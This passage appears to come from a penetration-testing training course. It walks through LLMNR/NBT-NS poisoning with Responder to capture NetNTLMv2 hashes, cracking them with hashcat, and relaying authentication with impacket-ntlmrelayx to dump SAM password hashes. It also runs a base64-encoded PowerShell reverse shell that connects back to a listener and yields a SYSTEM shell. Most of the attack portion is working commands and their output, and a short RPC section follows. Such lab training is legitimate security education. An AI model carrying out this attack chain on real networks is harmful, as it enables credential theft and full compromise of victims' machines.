The most common tool to perform such operations is the `Responder`. [Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Let's illustrate an example to understand better how `Responder` works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:

crimsonguard@htb[/htb]`$ responder -I <interface name>`

When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

crimsonguard@htb[/htb]`$ sudo responder -I ens33                                           __                  .----.-----.-----.-----.-----.-----.--|  |.-----.----.   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|   |__| |_____|_____|   __|_____|__|__|_____||_____|__|                    |__|                           NBT-NS, LLMNR & MDNS Responder 3.0.6.0                   Author: Laurent Gaffie (laurent.gaffie@gmail.com)   To kill this script hit CTRL-C  [+] Poisoners:                     LLMNR                      [ON]     NBT-NS                     [ON]             DNS/MDNS                   [ON]                                                                                                                                                                                               [+] Servers:              HTTP server                [ON]                                        HTTPS server               [ON]     WPAD proxy                 [OFF]                                       Auth proxy                 [OFF]     SMB server                 [ON]                                        Kerberos server            [ON]                                        SQL server                 [ON]                                        FTP server                 [ON]                                        IMAP server                [ON]                                        POP3 server                [ON]                                        SMTP server                [ON]                                        DNS server                 [ON]                                        LDAP server                [ON]     RDP server                 [ON]     DCE-RPC server             [ON]     WinRM server               [ON]                                                                                                                        [+] HTTP Options:                                                                       Always serving EXE         [OFF]                                                    Serving EXE                [OFF]                                                    Serving HTML               [OFF]                                                    Upstream Proxy             [OFF]                                                 [+] Poisoning Options:                                                                  Analyze Mode               [OFF]                                                    Force WPAD auth            [OFF]                                                    Force Basic Auth           [OFF]                                                    Force LM downgrade         [OFF]                                                    Fingerprint hosts          [OFF]                                                 [+] Generic Options:                                                                    Responder NIC              [tun0]                                                   Responder IP               [10.10.14.198]                                           Challenge set              [random]                                                 Don't Respond To Names     ['ISATAP']                                            [+] Current Session Variables:                                                          Responder Machine Name     [WIN-2TY1Z1CIGXH]        Responder Domain Name      [HF2L.LOCAL]                                             Responder DCE-RPC Port     [48162]   [+] Listening for events...   [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser) [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election) [*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local [*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder [*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local [SMB] NTLMv2-SSP Client   : 10.10.110.17 [SMB] NTLMv2-SSP Username : WIN7BOX\demouser [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000`

These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

**Note:** If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.

crimsonguard@htb[/htb]`$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt  hashcat (v6.1.1) starting...  <SNIP>  Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344386 * Bytes.....: 139921355 * Keyspace..: 14344386  ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword                                                   Session..........: hashcat Status...........: Cracked Hash.Name........: NetNTLMv2 Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000 Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec) Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 75776/14344386 (0.53%) Rejected.........: 0/75776 (0.00%) Restore.Point....: 73728/14344386 (0.51%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: compu -> kodiak1  Started: Mon Apr 11 16:49:34 2022 Stopped: Mon Apr 11 16:49:37 2022`

The NTLMv2 hash was cracked. The password is `P@ssword`. If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

crimsonguard@htb[/htb]`$ cat /etc/responder/Responder.conf | grep 'SMB ='  SMB = Off`

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

crimsonguard@htb[/htb]`$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation  <SNIP>  [*] Running in relay mode to single host [*] Setting up SMB Server [*] Setting up WCF Server  [*] Servers started, waiting for connections  [*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146 [*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED [*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left! [*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left! [*] Service RemoteRegistry is in stopped state [*] Service RemoteRegistry is disabled, enabling it [*] Starting service RemoteRegistry [*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08::: demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: [*] Done dumping SAM hashes for host: 10.10.110.146 [*] Stopping service RemoteRegistry [*] Restoring the disabled state for service RemoteRegistry`

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

crimsonguard@htb[/htb]`$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'`

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

crimsonguard@htb[/htb]`$ nc -lvnp 9001  listening on [any] 9001 ... connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471  PS C:\Windows\system32> whoami;hostname  nt authority\system WIN11BOX`

#### RPC

In the [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:

- Change a user's password.
- Create a new domain user.
- Create a new shared folder.

We also cover enumeration using RPC in the [Active Directory Enumeration & Attacks module](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.

